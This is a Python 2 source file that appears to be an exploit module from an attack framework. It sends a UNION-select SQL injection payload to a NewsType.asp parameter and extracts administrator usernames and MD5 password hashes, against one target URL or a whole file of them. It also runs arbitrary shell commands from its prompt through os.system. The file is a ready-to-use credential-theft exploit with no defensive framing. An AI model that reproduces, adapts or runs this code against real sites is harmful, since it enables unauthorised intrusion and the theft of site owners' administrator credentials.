#!/usr/bin/env python
# encoding:utf-8
import requests
import re
from core import help
from comm import *

options = ["http://www.baidu.com",""]

def sql_exp():

    ksf_1 = ksf_line("liang sql")
    com = raw_input(ksf_1)
 
    try:
        if com[0:7] == 'set URL':
            url = com[8:]
            options[0] = url
            print tag_true + "set URL --> " + options[0]
            sql_exp()
        elif com[0:9] == 'set FILES': 
            files = com[10:]
            options[1] = files
            print tag_true + "set FILES --> " + options[1]
        elif com[0:12] == 'show options':
            show_op()
            print "URL\t\t" + options[0] + "\t\t Target's url "
            print "FILES\t\t" + options[1] + "\t\t url for files"
            sql_exp()
        elif com[0:1] == '!':
            os.system(com[1:])
            sql_exp()
        elif com[0:4] == 'help':
            help.help()
            sql_exp()
        elif com[0:4] == 'back':
            pass
        elif com[0:4] == 'exit':
            exit(0)
        elif com[0:3] == 'run' or com[0:7] == 'exploit':

            payload = "NewsType.asp?SmallClass=' union select 0,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9 from admin union select * from news where 1=2 and ''='"
            
            rer = re.compile(r'target=\\"_blank\\">(.*?)\|(.*?)</a></span>')
            if options[1]:
                with open(options[1],'r') as f:
                    for url in f.readlines():    
                        url = url.rstrip()
                        try:
                            r = requests.get(url+'/'+payload)
                            if "javastr" in r.content:
                                result = rer.findall(r.content)[0]
                                if result:
                                    print url
                                    print "[+] Found admin:{0}, passmd5:{1}".format(result[0],result[1])
                                    print "\n"
                        except:pass
                sql_exp()

            else:
                try:
                    r = requests.get(options[0]+'/'+payload)
                    if "javastr" in r.content:
                        result = rer.findall(r.content)[0]
                    if result:
                        print options[0]
                        print "[+] Found admin:{0}, passmd5:{1}".format(result[0],result[1])
                    else:
                        print "[-] Not Found"
                except:
                    print "[!] Some error,please check your network!"
                sql_exp()
            
            sql_exp()
        else:
            sql_exp()

    except KeyboardInterrupt:
        print_err("[*] Detected Ctrl-C ,System Exit...")
